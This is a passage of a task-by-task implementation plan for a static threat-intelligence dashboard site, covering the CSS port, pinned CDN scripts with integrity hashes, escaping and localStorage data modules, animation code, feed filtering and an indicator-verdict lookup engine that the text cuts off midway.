# SOCDESK Phase B — Chart Room Production Site Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the Phase A placeholder with the production Chart Room site — `design/mockups/g-chartroom.html` productionized against the real `site/data/*.json` contracts, elevated per the 2026-08-02 Front-End Elevation Charter (GSAP choreography, native platform APIs, D3 micro-modules), shipping all 9 spec-§4 capabilities.

**Architecture:** Multi-file static site in `site/` — no build step. Split CSS files + ES modules loaded natively; GSAP core + free Club plugins and D3 micro-modules as pinned CDN classic scripts with SRI (`window.gsap`/`window.d3` globals so our modules parse even if a CDN dies); all data fetched from `site/data/*.json`; per-analyst state (reviewed marks, since-last-visit cursor, vendor watchlist, notable flags) in namespaced localStorage. Every data string is HTML-escaped at render (pipeline sanitizes upstream; the site does not trust it — defense in depth). Strict CSP via `site/_headers` with **no** `unsafe-inline` anywhere: zero inline scripts, zero inline handlers, zero `style=""` attributes (dynamic styling via classes + CSSOM `setProperty`, which CSP does not block; GSAP also animates via CSSOM so it is unaffected). `wrangler pages deploy site` already ships whatever is in `site/`, so `_headers` deploys with no workflow change.

**Tech Stack:** Vanilla ES modules, GSAP 3.13.0 (core, ScrollTrigger, SplitText, ScrambleTextPlugin, DrawSVGPlugin, MotionPathPlugin, Flip), d3-array 3.2.4 / d3-scale 4.0.2 / d3-shape 3.2.0, View Transitions API + `content-visibility` (progressive), Playwright (`@playwright/test`) for the QA gate against `python -m http.server`.

**Scope:** Plan 2 of 3 (Phase A pipeline is live and untouched; Phase C Framework brief loop is separate). The mockup is the visual acceptance test — this plan ports it, never rewrites it. Charter craft disciplines get encoded into design-system v4.1 in the final task.

---

## ⚠ 2026-08-06 AMENDMENT — aggregator scope (overrides conflicting text below)

The compliance re-review (`COMPLIANCE.md`) and the owner's scope correction
change four things. Where this amendment conflicts with a task below, the
amendment wins.

1. **No IOC corpus.** `iocs.json` no longer exists (pipeline refactored
   2026-08-06). Any task step referencing `data.iocs`, `idx.ioc`, IOC-repository
   evidence rows, or `iocs.json` is void. The verdict engine's authority
   source is the KEV/NVD/EPSS join in `cves.json`; every other indicator type
   resolves to a **router verdict**: detected type + escalation card + pivots.
2. **Pivots are explicit user-clicked `<a href>` deep links only.** No
   auto-fan-out (one click must never dispatch an indicator to several
   services at once), no `fetch()` of any third-party service. Keep CSP
   `connect-src 'self'`.
3. **Disclosure banner, prominent** — persistent line in the search region,
   not a footnote: "Pivot links disclose this indicator to that third-party
   service (urlscan publishes public scans). Use public indicators only."
   Plus the privacy statement: nothing you paste or save leaves your browser.
4. **The escalation card is the product's centre of gravity** (owner's #2 core
   function; the real differentiator vs. two seconds to VT). It is a
   first-class panel of the verdict view, not an export afterthought, and it
   must pass the **generic test**: *could an analyst at ANY company paste this
   unchanged, revealing nothing about how one specific employer notifies its
   clients?* Author from scratch — never reproduce an employer's ticket
   template, severity taxonomy, SLA language, or client-facing phrasing.
   Fields: indicator (defanged) · type · verdict + basis · KEV/EPSS/CVSS
   context when a CVE · sources with timestamps · pivot URLs · neutral
   suggested next steps. Copy as **Markdown** or **plain text**.

Also folded in: keyboard triage (`j/k/r/n/Enter`, `/` focus), localStorage
lookup history under the omnibox, watchlist badges on feed items, a
**Clear analyst state** button, and EPSS attribution in the footer.

## File structure

```
site/
  index.html                 # ported shell from g-chartroom.html (T1)
  _headers                   # CSP + security headers (T14)
  css/
    tokens.css               # design tokens (renamed) + motion tokens (T1)
    base.css                 # reset, body texture, wrap/caps/mono, reveal gating (T1)
    chrome.css               # topbar, masthead, hero, ticker, band, sec-head, footer (T1)
    ops.css                  # ops-tools, filters, feed, rail, verdict, seal (T1)
    panels.css               # vtable, brief, hgrid, toolbelt, semantic color classes (T1)
  js/
    app.js                   # entry: load -> boot order -> wiring (T3, grows through T13)
    data.js                  # fetch all payloads, staleness, esc/safeUrl, formatters (T2)
    state.js                 # localStorage analyst state (T2)
    motion.js                # GSAP registration, motion tokens, primitives (T3)
    render/
      chrome.js              # masthead numbers, live count, ticker, stat band (T3)
      feed.js                # feed rows, filters, search, FLIP, reviewed/boundary (T4)
      rail.js                # item detail card + analyst actions (T5)
      verdict.js             # lookup index, verdict logic, bulk table, exports (T6)
      brief.js               # daily brief render + staleness + shimmer (T7)
      vulns.js               # CVE table, sorting, watchlist (T8)
      profiles.js            # actor/malware profile cards + cross-links (T9)
      health.js              # health grid + sparklines (T10)
      registry.js            # source registry table (T10)
    toolbelt/
      tools.js               # CARL public-data snapshot port (T11)
      belt.js                # toolbelt UI wiring + handoff digest (T11, T12)
site-tests/
  package.json  playwright.config.js
  specs/  chrome.spec.js feed.spec.js verdict.spec.js brief.spec.js
          vulns.spec.js health-registry.spec.js toolbelt.spec.js
          state.spec.js csp.spec.js
```

## Shared conventions (used by every task)

- **Real data shapes (verified against the live files 2026-08-02):** `feed.json` `{generated_at, schema_version, items[]}` (spec-§6 item shape); `cves.json` `{cves[]}` (4,300+ rows: `cve,title,cvss,cvss_severity,epss,epss_percentile,kev,kev_date_added,kev_ransomware,vendors[],products[],published_at,last_modified`); `iocs.json` `{iocs:{ipv4,domain,url,md5,sha256}}` (**currently all empty** — abuse.ch 401s in health; the miss path is the live path, treat it as first-class); `actors.json` / `malware.json` `{profiles:[{name,attack_id,aliases,description,techniques,software}]}`; `health.json` `{sources[]}` (8 entries incl. `epss`; `attack` appears only on cache-refresh runs — render whatever is present, never hardcode 9); `sources.json` (24 rows: `name,kind,slug,url,coverage,enabled`); `brief.json` **may 404 until Phase C** — expected contract `{generated_at, schema_version, stories:[{title,summary,why_it_matters}], trending:[], kev_notables:[]}`, render defensively field-by-field.
- **Escaping law:** every interpolation of any data-derived string goes through `esc()`; every `href` through `safeUrl()`. No exceptions, including mono/ID fields. Playwright T15 asserts an injection fixture renders inert.
- **Token renames (design-system §8):** `--amber`→`--accent`, `--amber-dim`→`--accent-dim`, `--ink-on-amber`→`--ink-on-accent`, in both declarations and every `var()` use.
- **Motion law:** every JS animation gates on `motionOK`; final textual/layout state must be correct with GSAP absent (CDN failure) and with reduced-motion. Durations/eases only from motion tokens. Nothing animates past 1.6s except the ticker (design-system §7.8).
- **No-inline law (for T14 CSP):** no `<script>` without `src`, no `on*=` attributes, no `style=""` attributes in HTML or in JS-built template strings. Dynamic color/stagger = classes (`sev-critical`, `cat-ransomware`, `tone-red`…) or `el.style.setProperty()` after insertion.
- **Verification server:** `python -m http.server 8123 --directory site` from repo root (Phase A venv python).
- Commits after every task, same style as Phase A.

Charter choreography → task map (self-review checks this): #1 boot decode cascade → T3/T13 · #2 scroll-scrubbed ink draws → T13 · #3 grid wavefront → T10 · #4 eased count-ups → T3 · #5 seal-stroke frames → T6 · #6 sectional master timelines → T13 · #7 sparkline+rider → T10 · #8 ticker velocity/hover → T3 · #9 verdict signature sequence → T6 · #10 FLIP/View-Transition filtering → T4 · #11 KokonutUI ports (omnibox → T6, AI shimmer → T7, spotlight → T13).

---

### Task 1: Scaffold — split CSS port, token renames, index.html shell, pinned CDN + SRI

**Files:**
- Create: `site/css/tokens.css`, `site/css/base.css`, `site/css/chrome.css`, `site/css/ops.css`, `site/css/panels.css`, `site/js/app.js` (stub)
- Modify: `site/index.html` (replace placeholder entirely)

- [ ] **Step 1: Port CSS from the mockup into the five files, with exact deltas**

Source: `design/mockups/g-chartroom.html` — head `<style>` (lines 10–108) and body `<style>` (lines 111–237). Distribute:
- `tokens.css` ← `:root` block (lines 11–24) **plus** new motion tokens appended:
```css
:root{
  /* motion tokens — charter craft discipline 4; JS mirrors in js/motion.js */
  --dur-tap:150ms; --dur-enter:600ms; --dur-draw:1100ms;
  --ease:cubic-bezier(.16,1,.3,1);        /* out-expo-ish: enters, draws */
  --ease-inout:cubic-bezier(.65,0,.35,1); /* scrubbed/reversible draws  */
}
```
- `base.css` ← lines 25–52 (reset, body texture, selection, scrollbar, `.wrap/.caps/.mono`, `.reveal`).
- `chrome.css` ← lines 54–107 (topbar → ticker) + lines 112–128 (band, sections) + lines 232–237 (fband, foot, reduced-motion block).
- `ops.css` ← lines 130–192 (ops-tools → ev rows).
- `panels.css` ← lines 194–231 (vtable → tool).

Exact deltas while porting (spell-check each):
1. Token renames per Shared conventions — after porting, `--amber` must not appear anywhere.
2. **Delete** line 25 (`@property --sweep`), lines 162–166 (`.rail.hot`, its `::before`, `@keyframes sweepspin`). Charter #5 replaces the conic sweep with seal-stroke frames (T6).
3. `.reveal` rules (lines 49–52): gate initial-hidden state behind a JS-present class so a dead CDN/JS never yields an invisible page:
```css
html.js .reveal{opacity:0;transform:translateY(24px)}
.reveal{transition:opacity var(--dur-enter) var(--ease),transform .7s var(--ease);transition-delay:calc(var(--i,0)*70ms)}
html.js .reveal.in{opacity:1;transform:none}
```
(The reduced-motion block at line 236–237 ports unchanged and stays last in `chrome.css`.)
4. `.sec-head` (line 123): remove `border-bottom:1px solid var(--line-bright)`; a real `<div class="rule">` child replaces it (animatable in T13): add `.rule{position:absolute;left:0;right:0;bottom:0;height:1px;background:var(--line-bright);transform-origin:left}`.
5. `.row` gains virtualization + reviewed/boundary states (used T4):
```css
.row{content-visibility:auto;contain-intrinsic-size:auto 96px}
.row.reviewed{opacity:.45}
.row.reviewed .t{text-decoration:line-through;text-decoration-color:var(--line-bright)}
.new-boundary{display:flex;align-items:center;gap:12px;padding:8px 20px;color:var(--mark);font-size:9px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;border-bottom:1px solid var(--line)}
.new-boundary::after{content:'';flex:1;height:1px;background:var(--mark);opacity:.4}
```
6. Append to `panels.css` the semantic color classes replacing the mockup's inline styles (no-inline law):
```css
.sev-critical{color:var(--red)}.sev-high{color:var(--orange)}.sev-medium{color:var(--gold)}
.sev-low{color:var(--green)}.sev-info{color:var(--blue)}.sev-unknown{color:var(--muted)}
.cat-ransomware{color:var(--orange);border-color:var(--orange)}
.cat-vulnerability{color:var(--blue);border-color:var(--blue)}
.cat-malware{color:var(--gold);border-color:var(--gold)}
.cat-report{color:var(--green);border-color:var(--green)}
.cat-apt,.cat-campaign{color:var(--paper);border-color:var(--paper)}
.tone-red{color:var(--red);border-color:var(--red)}.tone-orange{color:var(--orange);border-color:var(--orange)}
.tone-gold{color:var(--gold);border-color:var(--gold)}.tone-green{color:var(--green);border-color:var(--green)}
.tone-muted{color:var(--muted);border-color:var(--muted)}.tone-accent{color:var(--accent);border-color:var(--accent)}
.seal{position:absolute;inset:0;width:100%;height:100%;pointer-events:none}
.seal rect{fill:none;stroke-width:1.5}
.stale-chip{border:1px solid var(--gold);color:var(--gold);font-family:var(--mono);font-size:9px;letter-spacing:.14em;padding:4px 8px}
```
(Category mapping honors design-system §3: ransomware orange · vulnerability blue · malware gold · report/threat-intel green · apt/campaign paper-bordered. Severity unknown = `--muted`, never green.)

- [ ] **Step 2: Write the new `site/index.html` shell (port markup lines 239–446, delete lines 447–709)**

Port the mockup body markup with these exact deltas:
1. Head: keep charset/viewport/title/preconnects/fonts link (lines 4–9) verbatim; add `<meta name="description" content="SOCDESK — the night watch for open-source threat intelligence. Live CTI feed, vulnerability triage, IOC verdicts, analyst toolbelt.">`; replace the inline `<style>` with five `<link rel="stylesheet" href="css/…">` in tokens→base→chrome→ops→panels order.
2. Before `</body>`: pinned CDN scripts (integrity attrs filled in Step 3), then the module entry:
```html
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrollTrigger.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/SplitText.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrambleTextPlugin.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/DrawSVGPlugin.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/MotionPathPlugin.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/Flip.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/d3-array@3.2.4/dist/d3-array.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/d3-scale@4.0.2/dist/d3-scale.min.js"></script>
<script defer crossorigin="anonymous" integrity="sha384-…" src="https://cdn.jsdelivr.net/npm/d3-shape@3.2.0/dist/d3-shape.min.js"></script>
<script type="module" src="js/app.js"></script>
```
3. Mockup lines 447–523 (sample-data script) and 524–709 (behavior script): **deleted entirely**. Only `detectType` (lines 639–647) survives, ported into `js/data.js` (T2).
4. Static values → data-driven hooks: `.mast-ed` block (lines 262–266) becomes three lines with `<b id="mastEdition">`, `<b id="mastCount">0</b>`, `<b id="mastRefreshed">—</b>`, `<b id="mastBrief">—</b>`; `.live` (line 254) → `<span class="live"><b></b><span id="liveCount">—</span></span>`; band buttons (lines 292–296) keep `data-cat` (`all|ransomware|malware|apt`) but `<b data-count>` starts empty and labels lose fantasy counts; sec-descs keep prose but the brief sec-desc timestamp span becomes `<span class="mono" id="briefGenerated">—</span>`; filter chips (lines 353–361) are **removed from HTML** (rendered from data in T4, categories = real enum `ransomware|vulnerability|malware|apt|campaign|report`); registry sec-kicker count spans get ids `regCollectors`/`regReference`.
5. Remove every inline `style=""` (lines 305, 364, 367, 444…): `--i` staggers move to JS `setProperty`; `#fhCat` styling becomes a class `.plain{font-style:normal}`.
6. TRY chips (lines 283–285): replace hardcoded samples with `<div class="ex-row" id="exRow"><span class="ex-label">Try</span></div>` — chips built in T6 from real data (top KEV CVE, a live IOC if the repository is non-empty, an actor name).
7. Toolbelt section (lines 422–433): keep the two ported `.tool` cards (defang, extract) and add three more cards with the same structure and ids `b64In/b64Out/b64Btn`, `psIn/psOut/psBtn`, `lolbinIn/lolbinOut/lolbinBtn`, headers "Base64 decode (UTF-16LE aware)", "PowerShell command parser", "LOLBin lookup". Add to the ops-tools bar (after `.export`, line 350): `<button class="export" id="handoffBtn">Handoff ↗</button>` and change the existing export button to `<button class="export" id="exportBtn">Export JSON ↓</button>`.
8. Each `.sec-head` gets `<div class="rule"></div>` appended (delta 4 of Step 1). Add `<div id="staleChips"></div>` inside the topbar `.wrap` after the TLP chip (staleness indicators, T3).
9. Add before `</body>`: `<noscript><p class="caps noscript-note">SOCDESK requires JavaScript to render collected intelligence.</p></noscript>` and add `.noscript-note{padding:20px}` to `base.css` (no-inline law is absolute).
10. `js/app.js` stub for this task only: `document.documentElement.classList.add("js"); console.log("socdesk boot");`

- [ ] **Step 3: Pin SRI hashes**

For each of the ten CDN URLs run and paste into the `integrity` attribute:
```bash
curl -s "https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js" | openssl dgst -sha384 -binary | openssl base64 -A
```
(repeat per file; format `sha384-<output>`).

- [ ] **Step 4: Verify**

Run: `python -m http.server 8123 --directory site` then open `http://localhost:8123`.
Expected: Chart Room chrome renders (masthead, empty dynamic slots, sections, toolbelt with 5 cards); zero console errors; `grep -rn "amber" site/css site/index.html` → no matches; `grep -rn "onclick\|style=\"" site/index.html` → no matches.

- [ ] **Step 5: Commit**
```bash
git add site/index.html site/css site/js
git commit -m "feat(site): Chart Room shell — split CSS port, token renames, pinned CDN with SRI"
```

---

### Task 2: Data layer — fetch, staleness, escaping, analyst state

**Files:**
- Create: `site/js/data.js`, `site/js/state.js`

- [ ] **Step 1: Write `site/js/data.js`** (complete):

```js
// data.js — payload loading, freshness, escaping. Defense in depth: the
// pipeline sanitizes, the site STILL escapes everything at render.
const FILES = ["feed","cves","iocs","actors","malware","health","sources"];

export const esc = s => String(s ?? "").replace(/[&<>"']/g,
  c => ({ "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" }[c]));
export const safeUrl = u => /^https?:\/\//i.test(String(u ?? "")) ? esc(u) : "";

export async function loadAll() {
  const data = {};
  await Promise.all([...FILES, "brief"].map(async name => {
    try {
      const r = await fetch(`data/${name}.json`);
      data[name] = r.ok ? await r.json() : null;   // brief.json 404s until Phase C
    } catch { data[name] = null; }
  }));
  return data;
}

export const ageMin = iso => iso ? Math.max(0, (Date.now() - Date.parse(iso)) / 60000) : Infinity;
export function rel(iso) {
  const m = ageMin(iso);
  if (!isFinite(m)) return "—";
  if (m < 1) return "Now";
  if (m < 60) return `${Math.round(m)}m ago`;
  if (m < 1440) return `${Math.round(m / 60)}h ago`;
  return `${Math.round(m / 1440)}d ago`;
}
export const day = iso => (iso || "").slice(0, 10) || "—";
export const num = n => (n ?? 0).toLocaleString("en-US");

// ported verbatim from design/mockups/g-chartroom.html lines 639-647
export function detectType(q) {
  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(q)) return "ipv4";
  if (/^[a-f0-9]{64}$/i.test(q)) return "sha256";
  if (/^[a-f0-9]{32}$/i.test(q)) return "md5";
  if (/^cve-\d{4}-\d{4,7}$/i.test(q)) return "cve";
  if (/^https?:\/\//i.test(q)) return "url";
  if (/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(q)) return "domain";
  return "";
}

export const STALE_FEED_MIN = 90, STALE_BRIEF_MIN = 26 * 60;   // spec §9 / §3.2
export function staleness(data) {
  const out = [];
  if (ageMin(data.feed?.generated_at) > STALE_FEED_MIN)
    out.push({ file: "feed", label: `FEED STALE · ${rel(data.feed?.generated_at)}` });
  if (data.brief && ageMin(data.brief.generated_at) > STALE_BRIEF_MIN)
    out.push({ file: "brief", label: `BRIEF STALE · ${rel(data.brief.generated_at)}` });
  return out;
}
```

- [ ] **Step 2: Write `site/js/state.js`** (complete):

```js
// state.js — per-analyst localStorage state. All reads guarded; quota/serialization
// failures degrade to in-memory state, never a broken page.
const NS = "socdesk:v1:";
const read = (k, fb) => { try { return JSON.parse(localStorage.getItem(NS + k)) ?? fb; } catch { return fb; } };
const write = (k, v) => { try { localStorage.setItem(NS + k, JSON.stringify(v)); } catch {} };

export const state = {
  reviewed:  read("reviewed", {}),    // feed item id -> ISO marked-at
  notable:   read("notable", {}),     // feed item id -> {title,url,source,ts}  (shift handoff)
  watchlist: read("watchlist", []),   // lowercase vendor strings
  lastVisit: "",                      // ISO of the PREVIOUS session start (set in beginSession)
};

export function beginSession() {
  state.lastVisit = read("sessionStart", "");
  write("sessionStart", new Date().toISOString());
}
export function toggleReviewed(id) {
  if (state.reviewed[id]) delete state.reviewed[id];
  else state.reviewed[id] = new Date().toISOString();
  write("reviewed", state.reviewed);
}
export function toggleNotable(item) {
  if (state.notable[item.id]) delete state.notable[item.id];
  else state.notable[item.id] = { title: item.title, url: item.url, source: item.source,
                                  ts: new Date().toISOString() };
  write("notable", state.notable);
}
export function setWatchlist(vendors) {
  state.watchlist = [...new Set(vendors.map(v => v.trim().toLowerCase()).filter(Boolean))];
  write("watchlist", state.watchlist);
}
export function pruneReviewed(liveIds) {   // call once per boot with Set of feed ids
  let dirty = false;
  for (const id of Object.keys(state.reviewed))
    if (!liveIds.has(id)) { delete state.reviewed[id]; dirty = true; }
  if (dirty) write("reviewed", state.reviewed);
}
```

- [ ] **Step 3: Verify**

Run: with the server up, in the browser console on `http://localhost:8123`:
`const d = await import("./js/data.js"); const all = await d.loadAll(); [all.feed.items.length > 100, d.esc("<b>&") === "&lt;b&gt;&amp;", d.safeUrl("javascript:x") === "", (await import("./js/state.js")).state]`
Expected: `[true, true, true, {…}]`, no errors.

- [ ] **Step 4: Commit**
```bash
git add site/js/data.js site/js/state.js
git commit -m "feat(site): data layer with escaping discipline and localStorage analyst state"
```

---

### Task 3: Boot chrome — masthead, live wire ticker, stat band + boot choreography (charter #1, #4, #8)

**Files:**
- Create: `site/js/motion.js`, `site/js/render/chrome.js`
- Modify: `site/js/app.js`

- [ ] **Step 1: Write `site/js/motion.js`** (complete — every later task imports from here; the mockup's rAF `scramble`/`countUp`/IO code, lines 531–562, is superseded and must not be ported):

```js
// motion.js — GSAP wiring + motion tokens + shared primitives.
// GSAP arrives as classic-script globals; if the CDN failed, `g` is null and
// every primitive falls through to its correct final state.
export const motionOK = matchMedia("(prefers-reduced-motion: no-preference)").matches;
export const g = (typeof gsap !== "undefined" && motionOK) ? gsap : null;
export const DUR = { tap: .15, enter: .6, draw: 1.1 };          // mirrors css tokens
export const EASE = "expo.out", EASE_INOUT = "power2.inOut";
export const SCRAM_CHARS = "!<>-_\\/[]{}—=+*^?#";               // Plex Mono charset
if (g) g.registerPlugin(ScrollTrigger, SplitText, ScrambleTextPlugin,
                        DrawSVGPlugin, MotionPathPlugin, Flip);

export function decode(el, text, dur = .9) {          // charter #1 / #9
  if (!g) { el.textContent = text; return null; }
  return g.to(el, { duration: dur, ease: "none",
    scrambleText: { text, chars: SCRAM_CHARS, speed: .4 } });
}
export function countUp(el, target, dur = DUR.draw) { // charter #4 — outExpo, once
  if (!g) { el.textContent = target.toLocaleString("en-US"); return; }
  const o = { n: 0 };
  g.to(o, { n: target, duration: dur, ease: EASE,
    onUpdate: () => { el.textContent = Math.round(o.n).toLocaleString("en-US"); } });
}
export function onEnter(el, fn) {                     // fire-once entry trigger
  if (!g) { fn(); return; }
  ScrollTrigger.create({ trigger: el, start: "top 85%", once: true, onEnter: fn });
}
export function sealStroke(card, cssColor = "var(--mark)") {  // charter #5
  if (!g) return;
  const ns = "http://www.w3.org/2000/svg";
  card.querySelector(":scope > .seal")?.remove();
  const svg = document.createElementNS(ns, "svg"); svg.setAttribute("class", "seal");
  const r = document.createElementNS(ns, "rect");
  r.setAttribute("x", 1); r.setAttribute("y", 1);
  r.setAttribute("width", "calc(100% - 2px)"); r.setAttribute("height", "calc(100% - 2px)");
  r.style.stroke = cssColor;
  svg.append(r); card.append(svg);
  g.fromTo(r, { drawSVG: "0%" }, { drawSVG: "100%", duration: DUR.draw, ease: EASE_INOUT });
}
export function startTicker(track) {                  // charter #8
  if (!g) { track.classList.add("css-tick"); return; }   // css-tick = mockup keyframes fallback
  const loop = g.to(track, { xPercent: -50, duration: 46, ease: "none", repeat: -1 });
  loop.timeScale(3);
  g.to(loop, { timeScale: 1, duration: 1.6, ease: "power2.out" });      // velocity settle
  const view = track.parentElement;
  view.addEventListener("pointerenter", () => g.to(loop, { timeScale: .15, duration: .4 }));
  view.addEventListener("pointerleave", () => g.to(loop, { timeScale: 1, duration: .4 }));
}
```
Delta in `chrome.css`: rename the mockup's `.tick-track` animation rule (line 103) so the CSS marquee only applies to `.tick-track.css-tick` (GSAP owns it otherwise), and keep `@keyframes tick`.

- [ ] **Step 2: Write `site/js/render/chrome.js`**: exports `renderChrome(data)` which (all through `esc`): sets `#mastEdition` to `feed.generated_at` date + weekday; `countUp(#mastCount, total)` where total = feed items + cve rows + all ioc entries + actor/malware profiles; `#mastRefreshed` = `rel(feed.generated_at)` and `#mastBrief` = brief ? `rel(brief.generated_at)` : "—"; `#liveCount` = `${health.sources.filter(s=>s.ok).length}/${health.sources.length} collectors online` (dot stays `--mark`); staleness chips into `#staleChips` (`.stale-chip` per `staleness(data)` entry); band `<b>` targets = feed window counts (all / per `data-cat`) fed to `countUp` via `onEnter`; ticker items built from real data — latest 2 KEV rows (`NEW KEV`, tone-red), latest 2 ransomware feed items (`RANSOMWARE`, tone-orange), top EPSS KEV row (`EPSS`, tone-red), latest apt/campaign item (`APT`, tone class on `.tick-item b`, never an inline style), track content duplicated once for the -50% loop exactly as mockup line 565.

- [ ] **Step 3: Grow `app.js`** into the real boot order: add `html.js` class → `beginSession()` → `loadAll()` → `pruneReviewed` → `renderChrome` → boot timeline: masthead rise (`g.from(".mast-name", {yPercent:12, opacity:0, duration:.7, ease:EASE})`) overlapped with `decode(#tagline, "TRACK · VERIFY · VERDICT · PIVOT — REFRESHED EVERY 30 MINUTES")` at `-=.3`, then `startTicker`. If `data.feed` is null, render the failure state: band shows "—", feed area (T4) shows last-known-good message. Keep the mockup's IO-based `.reveal` behavior temporarily by instantiating one IntersectionObserver adding `.in` (replaced by sectional timelines in T13).

- [ ] **Step 4: Verify** — reload: masthead numbers count up once with expo ease, tagline decodes once (never loops), ticker settles from fast to 46s cruise and decelerates on hover, band counts match `feed.items` filtered lengths (spot-check in console), reduced-motion emulation (DevTools) renders all final values instantly.

- [ ] **Step 5: Commit** — `git add site/js && git commit -m "feat(site): live chrome with boot choreography, real-data ticker and stat band"`

---

### Task 4: Threat operations feed — capability §4.1 + FLIP filtering (charter #10)

**Files:**
- Create: `site/js/render/feed.js`
- Modify: `site/js/app.js`

- [ ] **Step 1: Write `feed.js`.** Contracts:
  - `initFeed(data, { onSelect })` builds category chips into `#filters` from the real enum + counts, wires `#q2` (debounced 150ms substring match over title+summary+entities), band buttons (T3) call into the same `setFilter`.
  - Row template (port of mockup lines 571–576 with deltas): `class="row cat" data-id`, tag uses `cat-*` class not inline style; adds a right-column reviewed toggle button `<button class="act rv" data-act="review">✓</button>` under `.tm`; `.tm` = `rel(published_at)`; all fields escaped; title is not a link in-row (rail owns the outbound link).
  - **Since-last-visit boundary:** while rendering sorted-desc items, insert `<div class="new-boundary">New since last visit · <n></div>` before the first item with `published_at <= state.lastVisit` (skip if lastVisit empty or nothing new).
  - **Mark-reviewed:** click on `[data-act=review]` → `toggleReviewed(id)` + `.reviewed` class toggle (no re-render, event delegation on `#feedRows`; stopPropagation so the row doesn't select).
  - **FLIP filtering (charter #10):**
```js
function applyFilter(next) {
  if (!g) {
    if (document.startViewTransition) document.startViewTransition(() => render(next));
    else render(next);
    return;
  }
  const snap = Flip.getState("#feedRows .row");
  render(next);
  Flip.from(snap, { duration: .45, ease: EASE, stagger: .015, absolute: true,
    onEnter: els => g.fromTo(els, { opacity: 0, y: 12 }, { opacity: 1, y: 0, duration: .3 }),
    onLeave: els => g.to(els, { opacity: 0, duration: .2 }) });
}
```
  - `#exportBtn` downloads the currently filtered items as JSON (`Blob` + `URL.createObjectURL`, filename `socdesk-feed-<date>.json`).
  - Header counts (`#fhCount`, `#fhCat`, `#resChip`) from real lengths. Spotlight pointer-wash: shared delegated `pointermove` handler setting `--rx/--ry` (port of mockup lines 582–586, via `setProperty`).

- [ ] **Step 2: Wire in `app.js`**; default select first row → rail (T5 renders it; until then log).
- [ ] **Step 3: Verify** — filters reflow rows honestly (no teleport) with stagger; search narrows live; reviewed rows persist dimmed across reload; boundary appears on second reload after new data (simulate: edit `sessionStart` key back one day in DevTools); export downloads valid JSON; `content-visibility` active (Performance panel: offscreen rows skipped).
- [ ] **Step 4: Commit** — `git commit -am "feat(site): operations feed with FLIP filtering, reviewed marks and visit boundary"`

---

### Task 5: Rail item detail + cross-cutting copy actions

**Files:**
- Create: `site/js/render/rail.js`
- Modify: `site/js/render/feed.js` (selection hookup)

- [ ] **Step 1: Write `rail.js`** — `renderItem(item)` ports mockup `renderRail` (lines 591–600) with deltas: all values escaped; publisher/source/published rows from real fields (`source`, `day(published_at)`); title links out via `safeUrl(item.url)` with `target="_blank" rel="noopener"`; entity chips row (actors/malware/vendors/cves from `item.entities`) — clicking one runs the omnibox lookup (T6/T9); analyst actions (event delegation, no inline handlers):
  - **Copy defanged** — `defang` from T11's `tools.js` applied to `item.url` + any `item.iocs[].value`, clipboard.
  - **Copy raw** — same, un-defanged (cross-cutting requirement: both are always offered).
  - **Copy blurb** — client-notification blurb, generic wording, no client names:
```js
const blurb = `FYI — open-source reporting: ${item.title}. ` +
  `Summary: ${item.summary} Severity: ${item.severity}. Reference: ${defang(item.url)}. ` +
  `We are monitoring for related indicators across your environment.`;
```
  - **Flag notable** — `toggleNotable(item)`, button gets `.on` (tone-accent) state; shows count in `#handoffBtn` label (`Handoff (n) ↗`).
  - Copy feedback: button text swaps to `COPIED` for 1.2s (no animation beyond the ≤200ms color transition).
- [ ] **Step 2: Verify** — selecting rows populates rail; each copy action puts expected text on clipboard (Playwright covers formally in T15); notable count survives reload.
- [ ] **Step 3: Commit** — `git commit -am "feat(site): rail detail with defang/raw/blurb copy and notable flagging"`

---

### Task 6: Indicator verdict — capability §4.4 + signature sequence (charter #9, #5, #11-omnibox)

**Files:**
- Create: `site/js/render/verdict.js`
- Modify: `site/js/app.js`, `site/js/render/rail.js`

- [ ] **Step 1: Lookup engine** (complete, in `verdict.js`):
```js
export function buildIndex(data) {
  const idx = { ioc: new Map(), cve: new Map(), name: new Map() };
  const buckets = data.iocs?.iocs ?? {};
  for (const type of Object.keys(buckets))
    for (const e of buckets[type]) idx.ioc.set(e.value.toLowerCase(), { ...e, ioc_type: type });
  for (const c of data.cves?.cves ?? []) idx.cve.set(c.cve.toUpperCase(), c);
  for (const kind of ["actors", "malware"])
    for (const p of data[kind]?.profiles ?? [])
      for (const n of [p.name, ...(p.aliases ?? [])]) idx.name.set(n.toLowerCase(), { ...p, kind });
  return idx;
}
export function verdict(raw, idx) {
  const q = raw.trim().replace(/\[\.\]/g, ".").replace(/hxxp/gi, "http");
  const t = detectType(q);
  if (t === "cve") {
    const c = idx.cve.get(q.toUpperCase());
    if (!c) return miss(q, "CVE");
    const score = Math.round((c.epss ?? (c.cvss ?? 0) / 10) * 100);
    return { kind: "cve", q, type: "CVE", score,
      word: c.kev ? "ACTIVELY EXPLOITED" : (c.cvss ?? 0) >= 9 ? "CRITICAL" : "TRACKED",
      tone: c.kev || (c.cvss ?? 0) >= 9 ? "red" : "orange", row: c };
  }
